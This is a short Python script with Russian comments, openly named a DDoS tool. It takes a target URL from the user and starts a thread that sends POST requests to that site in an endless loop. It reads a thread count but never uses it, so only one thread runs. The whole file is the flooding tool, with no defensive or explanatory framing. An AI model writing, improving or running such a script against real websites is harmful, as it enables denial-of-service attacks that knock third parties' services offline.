from requests import post
from threading import Thread
from functools import partial     # Чтобы передать аргументы в функцию DDOS


def DDOS(url):
    while True:
        request_one = post(url)
        request_two = post(url)   # Отправляем запросы на сайт


if __name__ == '__main__':
    site = input("Input URL: ")
    thread = int(input("Thread count: "))   # Получаем url и кол-во потоков от пользователя
    
    trd = Thread(target=partial(DDOS, site))
    trd.start()         # Вызываем функция DDOS
    
    print("DDOS is running")
